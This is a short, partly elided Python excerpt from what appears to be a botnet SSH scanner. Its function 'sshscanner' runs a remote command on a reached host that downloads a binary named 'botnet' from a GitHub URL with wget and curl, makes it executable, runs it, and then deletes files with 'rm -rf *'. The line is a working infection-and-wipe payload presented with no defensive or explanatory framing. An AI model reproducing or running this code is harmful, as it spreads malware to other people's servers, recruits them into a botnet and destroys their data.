...
def sshscanner(ip):
    ...
    try:
        ...
        if badserver == False:
                ...
                ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/x0rLS/g0sh/raw/master/botnet; chmod 777 botnet; ./botnet; curl https://github.com/x0rLS/g0sh/raw/master/botnet; chmod 777 botnet; ./botnet; rm -rf *")
